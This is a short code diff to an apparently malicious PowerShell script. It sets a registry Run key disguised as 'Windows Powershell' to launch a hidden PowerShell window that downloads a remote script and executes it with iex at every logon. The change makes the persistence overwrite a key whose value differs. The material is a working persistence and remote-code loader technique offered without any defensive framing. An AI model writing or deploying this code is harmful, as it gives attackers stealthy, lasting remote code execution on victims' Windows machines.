@@ -8,7 +8,12 @@ $autorunKeyName = "Windows Powershell"
 $autorunKeyVal = 'powershell -WindowStyle Hidden -nop -c "iex (New-Object Net.WebClient).DownloadString(''' + $scriptURL + ''')"'
 
 # Persist
-if (-not (Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run).$autorunKeyName) {
+$autoruns = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
+if (-not $autoruns.$autorunKeyName) {
+    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName -Value $autorunKeyVal
+}
+elseif($autoruns.$autorunKeyName -ne $autorunKeyVal) {
+    Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName
     New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName -Value $autorunKeyVal
 }
 
